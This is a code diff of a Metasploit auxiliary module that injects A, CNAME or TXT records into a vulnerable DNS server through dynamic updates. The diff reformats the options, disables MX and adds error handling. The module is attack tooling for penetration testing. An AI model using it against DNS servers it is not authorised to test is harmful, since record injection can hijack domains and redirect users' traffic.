@@ -3,7 +3,6 @@
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-require 'msf/core'
 require 'dnsruby'
 
 class MetasploitModule < Msf::Auxiliary
@@ -30,25 +29,25 @@ class MetasploitModule < Msf::Auxiliary
             ],
         'DefaultAction' => 'ADD'
     )
-    register_options(
-        [
-            OptString.new('DOMAIN', [true, 'The domain name']),
-            OptAddress.new('NS', [true, 'The vulnerable DNS server IP address']),
-            OptString.new('INJECTDOMAIN', [true, 'The name record you want to inject']),
-            OptAddress.new('INJECTIP', [true, 'The IP you want to assign to the injected record']),
-            OptEnum.new('TYPE',  [true, 'The record type you want to inject.', 'A', ['A', 'CNAME', 'TXT', 'MX']])
-        ], self.class)
-    register_advanced_options([
-                                  OptString.new('TXTSTRING', [true, 'The string to be injected with TXT record', 'w00t'])
-                              ])
-    deregister_options( 'RHOST', 'RPORT' )
 
+    register_options([
+      OptString.new('DOMAIN', [true, 'The domain name']),
+      OptAddress.new('NS', [true, 'The vulnerable DNS server IP address']),
+      OptString.new('INJECTDOMAIN', [true, 'The name record you want to inject']),
+      OptAddress.new('INJECTIP', [true, 'The IP you want to assign to the injected record']),
+      OptEnum.new('TYPE',  [true, 'The record type you want to inject.', 'A', ['A', 'CNAME', 'TXT']])
+    ])
+
+    register_advanced_options([
+      OptString.new('TXTSTRING', [true, 'The string to be injected with TXT record', 'w00t'
+    ])
+                              ])
+    deregister_options('RHOST', 'RPORT')
   end
 
   def a_record(action)
     # Send the update to the zone's primary master.
     resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
-    # Create the update packet.
     update   = Dnsruby::Update.new(datastore['DOMAIN'])
     case
       when action == 'ADD'
@@ -75,7 +74,7 @@ class MetasploitModule < Msf::Auxiliary
         end
     end
   end
-  #
+
   def cname_record(action)
     resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
     update   = Dnsruby::Update.new(datastore['DOMAIN'])
@@ -159,21 +158,27 @@ class MetasploitModule < Msf::Auxiliary
         end
     end
   end
-  # Run
+
   def run
-    print_status("Sending DNS query payload...")
-    case
-    when datastore['TYPE'] == 'A'
-      a_record(action.name)
-    when datastore['TYPE'] == 'CNAME'
-      cname_record(action.name)
-    when datastore['TYPE'] == 'TXT'
-      txt_record(action.name)
-    when datastore['TYPE'] == 'MX'
-      print_warning("Not implemented yet.")
-      mx_record(action.name)
-    else
-      print_error "Invalid Record Type!"
+    begin
+      print_status("Sending DNS query payload...")
+      case
+        when datastore['TYPE'] == 'A'
+          a_record(action.name)
+        when datastore['TYPE'] == 'CNAME'
+          cname_record(action.name)
+        when datastore['TYPE'] == 'TXT'
+          txt_record(action.name)
+#        MX does not work yet
+#        when datastore['TYPE'] == 'MX'
+#          mx_record(action.name)
+        else
+          print_error "Invalid Record Type!"
+      end
+    rescue Dnsruby::OtherResolvError
+      print_error("Connection Refused!")
+    rescue Dnsruby::DecodeError
+      print_error("None DNS protocol answer!, Make sure it's a DNS service")
     end
   end
 
